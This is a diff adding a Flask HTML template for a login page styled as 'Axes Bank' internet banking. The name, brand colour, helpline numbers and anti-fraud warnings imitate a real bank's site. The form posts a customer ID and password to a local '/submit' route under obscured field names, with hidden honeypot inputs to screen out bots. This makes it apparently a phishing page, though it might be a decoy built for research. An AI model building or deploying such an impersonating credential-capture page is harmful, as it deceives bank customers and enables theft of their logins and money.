@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Axes Bank - Internet Banking</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #90174c;
+      color: white;
+      padding: 15px;
+      text-align: center;
+    }
+
+    nav {
+      background-color: #e9e9e9;
+      padding: 10px;
+      text-align: right;
+    }
+
+    nav a {
+      text-decoration: none;
+      color: black;
+      margin-right: 20px;
+    }
+
+    .container {
+      display: flex;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .login-form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 5px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      width: 400px;
+    }
+
+    .login-form h2 {
+      margin-bottom: 20px;
+    }
+
+    .login-form input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 3px;
+    }
+
+    .login-form button {
+      background-color: #90174c;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    .login-form button:hover {
+      background-color: #90174c;
+    }
+
+    .login-form .forgot {
+      margin-bottom: 15px;
+    }
+
+    .login-form .forgot a {
+      color: #90174c;
+      text-decoration: none;
+    }
+
+    .login-form .register {
+      margin-top: 15px;
+      text-align: center;
+    }
+
+    .login-form .register a {
+      color: #90174c;
+      text-decoration: none;
+    }
+
+    .image {
+      width: 400px;
+      height: auto;
+      padding: auto;
+    }
+
+    .footer {
+      background-color: #e9e9e9;
+      padding: 10px;
+      text-align: center;
+      margin-top: 20px;}
+
+      .ffooter {
+            position: relative;
+            overflow: hidden;
+            white-space: nowrap;
+            width: 100%;
+            background-color: rgb(255, 255, 255);
+            
+      text-align: center;
+        }
+
+        .ffooter p {
+            color: #90174c;
+            display: inline-block;
+            position: relative;
+            animation: moveText 20s linear infinite;
+        }
+
+        @keyframes moveText {
+            0% {
+                left: 100%;
+            }
+            100% {
+                left: -100%;
+            }
+        }
+        .hpot {
+    opacity: 0;
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 0;
+    width: 0;
+    z-index: -1;
+  }
+      .grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr); /* 3 columns */
+    gap: 20px;
+    align-items: center;
+    padding: 20px;
+
+}
+
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Axes Bank - Internet Banking</h1>
+  </header>
+  <nav>
+    <a href="#">Axes Group</a>
+    <a href="#">About Us</a>
+    <a href="#">Customer Care</a>
+    <a href="#">Find ATM/Branch</a>
+    <a href="#">English</a>
+  </nav>
+  <footer class="ffooter">
+    <p><b>Dear Customer, never share your personal credentials like Credit or Debit Card number / Card expiry date / CVV / OTP / Internet Banking  passwords, with anyone over unsolicited phone calls / SMS / IVR / E-mail or through any links seeking card activation or upgrade / income tax refund / redemption of reward points etc. These are attempts by fraudsters to steal your personal banking credentials. Please contact bank's customer care number 1800 425 00000 immediately for any assistance.</b></p>
+  </footer>
+
+  <div class="grid">
+    <div class="login-form">
+      <h2>Welcome to Axes Bank - Internet Banking</h2>
+      <p>Login using:</p>
+      <form action="/submit" method="post">
+        <input type="text" id="dtx000" placeholder="Login ID / Customer ID" name="dtx000" required>
+        <input type="password" id="dtx001" placeholder="Password" name="dtx001" required>
+        <label class="hpot" for="id"></label>
+        <input class="hpot" type="text" id="id" name="id" autocomplete="off" placeholder="id">
+        <label class="hpot" for="name"></label>
+        <input class="hpot" type="password" id="password" name="password" autocomplete="off" placeholder="password">
+        <div class="forgot"><a href="#">Forgot your password?</a></div>
+        <button type="submit">Login</button>
+        <div class="register"><a href="#">First time user? Register here.</a></div>
+      </form>
+    </div>
+    <div class="image">
+      <img src="{{ url_for('static', filename='bg.png') }}" alt="Axes Bank" />
+      
+    </div>
+    <div ><p>
+        <b>Security Caution</b></p><p>
+        NEVER respond to any popup,email, SMS or phone call, no matter how appealing or official looking, seeking your personal information such as username, password(s), mobile number, ATM Card details, etc. Such communications are sent or created by fraudsters to trick you into parting with your credentials.
+    </p><p><b>Beware of Malicious/ Illegal Loan App/Websites.</b>    </p><p>
+
+
+        Axes Bank advises the customers to refrain from operating illegal loan Apps and not to fall prey to the illicit activities of the illegal lending Apps curbing illegal acts of the unregistered lending Apps so that it ensures their better security and online safety.
+        </p></div>
+  </div>
+  <footer class="footer">
+    <p>24x Helpline 1800 1234 1800 2100 (Toll-free)</p>
+  </footer>
+  {% with messages = get_flashed_messages() %}
+  {% if messages %}
+    <ul>
+    {% for message in messages %}
+      <li>{{ message }}</li>
+    {% endfor %}
+    </ul>
+  {% endif %}
+{% endwith %}
+
+</body>
+</html>
